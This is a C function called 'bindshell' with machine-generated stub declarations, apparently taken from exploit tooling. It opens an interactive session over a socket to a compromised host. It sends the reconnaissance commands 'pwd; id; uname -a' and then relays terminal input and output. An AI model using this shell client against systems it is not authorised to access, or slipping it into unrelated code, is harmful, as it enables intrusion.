
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef char u_char ;
struct pollfd {int events; int fd; int revents; } ;
typedef int fds ;


 int BUFSIZ ;
 int POLLERR ;
 int POLLHUP ;
 int POLLIN ;
 int POLLNVAL ;
 int errno ;
 int fatal (char*,...) ;
 int memset (struct pollfd**,int ,int) ;
 scalar_t__ poll (struct pollfd*,int,int) ;
 int read (int,char*,int) ;
 int strerror (int ) ;
 int strlen (char*) ;
 int write (int,char*,int) ;

__attribute__((used)) static void
bindshell (int sd)
{
 struct pollfd fds[2];
 u_char *cmds = "pwd; id; uname -a\n";
 u_char buf[BUFSIZ];
 int n;

 write (sd, cmds, strlen (cmds));

 while (1)
 {
  memset (&fds, 0, sizeof (fds));

  fds[0].events = fds[1].events = POLLIN;
  fds[0].fd = sd;
  fds[1].fd = 0;

  if (poll (fds, 2, -1) < 0)
   fatal ("poll(): %s\n", strerror (errno));

  if (fds[0].revents & (POLLERR | POLLNVAL | POLLHUP))
   fatal ("connection closed\n");

  if (fds[0].revents & POLLIN)
  {
   n = read (fds[0].fd, buf, BUFSIZ);
   if (n < 1)
    fatal ("connection closed\n");
   write (1, buf, n);
  }

  if (fds[1].revents & POLLIN)
  {
   n = read (fds[1].fd, buf, BUFSIZ);
   write (sd, buf, n);
  }
 }
}
